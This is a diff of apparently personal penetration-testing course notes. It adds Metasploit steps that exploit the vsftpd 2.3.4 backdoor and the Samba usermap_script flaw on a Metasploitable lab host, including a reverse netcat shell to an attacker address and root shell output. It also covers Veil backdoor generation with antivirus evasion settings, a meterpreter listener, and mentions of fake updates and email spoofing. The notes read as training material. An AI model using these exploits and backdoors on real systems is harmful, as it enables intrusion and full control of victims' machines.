@@ -186,7 +186,7 @@ net.sniff on
   Tool to downgrade = use SSL Strip 
 
 By pass HTTPS
-chech diferent caplets  caplets.show
+check diferent caplets  caplets.show
 
   bettercap comes with many caplets using caplets.show
   we will use hstshijack bybass caplet. 
@@ -282,10 +282,193 @@ ARP allow to be Man in the middle,Bettercap,Fake access pointt Honey pot(uses wi
 
 XArp used to automatically check if ARP Poisoning attack has been done.also wireshark can be used
 
-Metasploit commands
-msfconsole - runs metasploit
-help - show help
-sho[something] - something can be exploits,payloads,auxilaries or options
-use[something]
-set[option][value] - configure[option] to have a avlue of [value] ie set ip address of target. set ip set value of IP
-exploit - runs the current task
+Server sde attack
+
+  Metasploit commands
+  msfconsole - runs metasploit
+  help - show help
+  sho[something] - something can be exploits,payloads,auxilaries or options
+  use[something]
+  set[option][value] - configure[option] to have a avlue of [value] ie set ip address of target. set ip set value of IP
+  exploit - runs the current task
+
+  server side attack does not require user interaction
+
+      Discovered vulnerability vsftpd 2.3.4
+      use metasploit framework to see
+
+    For backdoor access
+
+      First vsftpd_234_backdoor
+
+        use exploit/unix/ftp/vsftpd_234_backdoor
+        show opions
+          Next is to change RHOST which is he target IP address
+        set RHOST 172.16.13.128
+        finally write exploit
+                you can run
+            pwd
+            /
+            id
+            uid=0(root) gid=0(root)
+            uname -a
+            Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+            ls
+
+        this will allow to access via back door
+
+    payload can refer to the part of an exploit that executes a specific desired action on the target system after an exploit has successfully created
+
+      Bind payload open a port in target comp,then hacker connect to that port
+
+      Reverse payload do vice versa.Opens a port in hacker machine and connect from target comp to my machine.
+
+      Reverse allow to bypass firewall if I have have firewall. 
+
+
+    Port 80 never filtered on firewall since browser and servers use it 
+
+    This  target comp has code execution vulnerability/buffer overflow. Does not has program to allo us write linux command ,insead it Allow write small pieces of code called payload .
+    We create payload and run on target computer.Payload allow us to even write linux command
+
+    payload are small pieces of code that willl be executed on the target comp once vulneerability is exploited 
+
+
+        Second samba
+          use exploit/multi/samba/usermap_script
+          show options
+          set RHOST 172.16.13.128
+          show options = this see if everything is configured
+          show payloads = choose the payload to use
+          set PAYLOAD cmd/unix/reverse_netcat
+          show option = to check if there is another options to set. There is LHOSt which is listening address which is my ip
+          set LHOST 192.168.100.178
+          show optios = see if changes have been set
+          set LPORT 80
+          exploit
+
+          you can run
+            pwd
+            /
+            id
+            uid=0(root) gid=0(root)
+            uname -a
+            Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+            ls
+
+        NEXPOSE
+          Discover open ports and running services
+          find vulnerabilities
+          find exploits
+          verify them
+          generate reports. ie botth technical and non teck reports
+          automate scans
+
+          To start NEXPOSE 
+            cd /opt/rapid7/nexpose
+            ls
+            cd nsc
+            ls
+            sudo ./nsc.sh
+
+            cd /opt/rapid7/nexpose
+            cd nsc
+            sudo ./nsc.sh
+
+CLient side attack
+  Veil framework
+    undetactable backdor file gives us full control over machine that it gets exexuted on. backdor can be  detected by anti virus
+
+    Usage
+
+   a type  veil
+
+    They are two tools
+
+    Evasion = generate undetactable backdoor
+    Ordnance = generate payload that used by evasion. aka helper 
+
+  b list
+  c use 1 = which is evasion
+  d list
+   it will show payload
+
+   common naming pattern
+    program which was writen/type of the payload/method to establish connection
+      type payload ie meterpreter by metasploit
+      method ie rev https.py = use reverse hhhtps connection
+
+  e use 15 
+  f set host to my machine by 
+    set LHOST 192.168.100.178
+     using port 80 target will think it is connecting to normal website , also 8080
+     set LPORT 8080
+  f options
+  g modify  to make backdoor  it bit diff for anti virus not to flag it
+      set PROCESSORS 1
+      set SLEEP 6
+
+  h generate backdoor by = generate
+  i name backdoor rev_https_8080 . to rem payload and port to use in future
+  
+  j check validity of file using
+    https://antiscan.me/ or https://www.virscan.org/
+    /var/lib/veil/output/compiled/rev_https_8080.exe
+
+    Listening incoming connection from meterpreter payload
+
+     a use exploit/multi/handler
+     b show options
+     c set PAYLOAD windows/meterpreter/reverse_https . if initial choose tcp,or http use that
+     d set LHOST 192.168.100.178
+     e set LPORT 8080
+     f exploit
+
+     g to test, put file http in var/www/html copy from lib veil
+     h service apache2 start , to start swebsite we start webserver apache2
+    Can use evil grade to create fake update and triggering user to update,highjack session by being MITM to make them download 
+
+    Social Engineering
+      use maltego
+
+      Email spoofing 
+
+       smtp server to spoof email
+         Email ssending. run  "sendemail --help"
+       web hosting
+
+ Website Hacking
+  Nexpose,Zenmap
+   and Maltego
+  
+whois lookup - find about the owner of the website https://whois.domaintools.com/amerix.co.ke
+netcraaft site report - shows technology used on the website  https://www.netcraft.com/tools/
+robtex DNS Lookup- show comprehensive info about the target https://www.robtex.com/
+
+discovering sensitive files man dirb
+   man dirb
+   dirb website to attack
+
+
+          Web hack
+
+          Weevly generates php files /php payload
+          -code execuition -shell
+          -local file execution
+          -remte file inclusion
+
+          SQL injection SQLMap
+
+  XSS types. java script is client base. attack on target user not web server.
+
+    persistence/storted. when person visit the page the code is executed 
+    reflected. excecuted when a partucular url is executed
+    DOM based. run without communication with web server unlike the two attacks above
+    
+
+
+
+
+
+
+
